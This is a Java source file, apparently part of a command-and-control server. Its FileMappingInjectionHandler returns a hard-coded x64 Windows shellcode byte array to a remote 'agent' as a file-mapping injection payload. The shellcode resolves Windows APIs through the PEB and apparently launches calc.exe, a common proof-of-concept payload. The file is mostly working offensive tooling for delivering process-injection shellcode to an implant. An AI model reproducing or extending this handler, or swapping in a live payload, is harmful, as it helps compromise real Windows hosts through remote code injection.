package org.server.handle;

import org.server.message.Message;
import org.server.message.MessageType;

import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.util.Random;

public class FileMappingInjectionHandler implements Handler{
    @Override
    public byte[] handle() {
        byte[] payload = new byte[] {
                (byte)0xFC, (byte)0x48, (byte)0x83, (byte)0xE4, (byte)0xF0, (byte)0xE8, (byte)0xC0, (byte)0x00,
                (byte)0x00, (byte)0x00, (byte)0x41, (byte)0x51, (byte)0x41, (byte)0x50, (byte)0x52, (byte)0x51,
                (byte)0x56, (byte)0x48, (byte)0x31, (byte)0xD2, (byte)0x65, (byte)0x48, (byte)0x8B, (byte)0x52,
                (byte)0x60, (byte)0x48, (byte)0x8B, (byte)0x52, (byte)0x18, (byte)0x48, (byte)0x8B, (byte)0x52,
                (byte)0x20, (byte)0x48, (byte)0x8B, (byte)0x72, (byte)0x50, (byte)0x48, (byte)0x0F, (byte)0xB7,
                (byte)0x4A, (byte)0x4A, (byte)0x4D, (byte)0x31, (byte)0xC9, (byte)0x48, (byte)0x31, (byte)0xC0,
                (byte)0xAC, (byte)0x3C, (byte)0x61, (byte)0x7C, (byte)0x02, (byte)0x2C, (byte)0x20, (byte)0x41,
                (byte)0xC1, (byte)0xC9, (byte)0x0D, (byte)0x41, (byte)0x01, (byte)0xC1, (byte)0xE2, (byte)0xED,
                (byte)0x52, (byte)0x41, (byte)0x51, (byte)0x48, (byte)0x8B, (byte)0x52, (byte)0x20, (byte)0x8B,
                (byte)0x42, (byte)0x3C, (byte)0x48, (byte)0x01, (byte)0xD0, (byte)0x8B, (byte)0x80, (byte)0x88,
                (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x48, (byte)0x85, (byte)0xC0, (byte)0x74, (byte)0x67,
                (byte)0x48, (byte)0x01, (byte)0xD0, (byte)0x50, (byte)0x8B, (byte)0x48, (byte)0x18, (byte)0x44,
                (byte)0x8B, (byte)0x40, (byte)0x20, (byte)0x49, (byte)0x01, (byte)0xD0, (byte)0xE3, (byte)0x56,
                (byte)0x48, (byte)0xFF, (byte)0xC9, (byte)0x41, (byte)0x8B, (byte)0x34, (byte)0x88, (byte)0x48,
                (byte)0x01, (byte)0xD6, (byte)0x4D, (byte)0x31, (byte)0xC9, (byte)0x48, (byte)0x31, (byte)0xC0,
                (byte)0xAC, (byte)0x41, (byte)0xC1, (byte)0xC9, (byte)0x0D, (byte)0x41, (byte)0x01, (byte)0xC1,
                (byte)0x38, (byte)0xE0, (byte)0x75, (byte)0xF1, (byte)0x4C, (byte)0x03, (byte)0x4C, (byte)0x24,
                (byte)0x08, (byte)0x45, (byte)0x39, (byte)0xD1, (byte)0x75, (byte)0xD8, (byte)0x58, (byte)0x44,
                (byte)0x8B, (byte)0x40, (byte)0x24, (byte)0x49, (byte)0x01, (byte)0xD0, (byte)0x66, (byte)0x41,
                (byte)0x8B, (byte)0x0C, (byte)0x48, (byte)0x44, (byte)0x8B, (byte)0x40, (byte)0x1C, (byte)0x49,
                (byte)0x01, (byte)0xD0, (byte)0x41, (byte)0x8B, (byte)0x04, (byte)0x88, (byte)0x48, (byte)0x01,
                (byte)0xD0, (byte)0x41, (byte)0x58, (byte)0x41, (byte)0x58, (byte)0x5E, (byte)0x59, (byte)0x5A,
                (byte)0x41, (byte)0x58, (byte)0x41, (byte)0x59, (byte)0x41, (byte)0x5A, (byte)0x48, (byte)0x83,
                (byte)0xEC, (byte)0x20, (byte)0x41, (byte)0x52, (byte)0xFF, (byte)0xE0, (byte)0x58, (byte)0x41,
                (byte)0x59, (byte)0x5A, (byte)0x48, (byte)0x8B, (byte)0x12, (byte)0xE9, (byte)0x57, (byte)0xFF,
                (byte)0xFF, (byte)0xFF, (byte)0x5D, (byte)0x48, (byte)0xBA, (byte)0x01, (byte)0x00, (byte)0x00,
                (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x48, (byte)0x8D, (byte)0x8D,
                (byte)0x01, (byte)0x01, (byte)0x00, (byte)0x00, (byte)0x41, (byte)0xBA, (byte)0x31, (byte)0x8B,
                (byte)0x6F, (byte)0x87, (byte)0xFF, (byte)0xD5, (byte)0xBB, (byte)0xE0, (byte)0x1D, (byte)0x2A,
                (byte)0x0A, (byte)0x41, (byte)0xBA, (byte)0xA6, (byte)0x95, (byte)0xBD, (byte)0x9D, (byte)0xFF,
                (byte)0xD5, (byte)0x48, (byte)0x83, (byte)0xC4, (byte)0x28, (byte)0x3C, (byte)0x06, (byte)0x7C,
                (byte)0x0A, (byte)0x80, (byte)0xFB, (byte)0xE0, (byte)0x75, (byte)0x05, (byte)0xBB, (byte)0x47,
                (byte)0x13, (byte)0x72, (byte)0x6F, (byte)0x6A, (byte)0x00, (byte)0x59, (byte)0x41, (byte)0x89,
                (byte)0xDA, (byte)0xFF, (byte)0xD5, (byte)0x63, (byte)0x61, (byte)0x6C, (byte)0x63, (byte)0x00
        };
        ByteBuffer agentBb = ByteBuffer.wrap(payload).order(ByteOrder.BIG_ENDIAN);
        return Message.createResponse(MessageType.FILE_MAPPING_INJECTION, agentBb.array());
    }
}
